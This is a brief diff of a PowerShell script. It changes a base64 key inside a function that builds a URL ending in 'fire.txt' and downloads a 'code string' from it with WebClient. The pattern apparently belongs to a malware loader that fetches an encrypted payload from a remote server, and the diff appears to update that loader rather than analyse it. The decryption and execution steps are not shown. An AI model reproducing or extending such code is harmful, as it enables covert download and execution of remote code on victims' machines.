@@ -27,7 +27,7 @@ $tid = "db"
 
 function getinfo
 {
-	$Key = "5R1668hcDBMae6BEGeMRAw=="
+	$Key = "YTxn3wEWHPKCL6Clfvi6zZ4IsIIXKvhHSkQURRS5lRs="
 	$endtag = "fire.txt"
 	$downpsurl = $rfvwd + $endtag
 	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
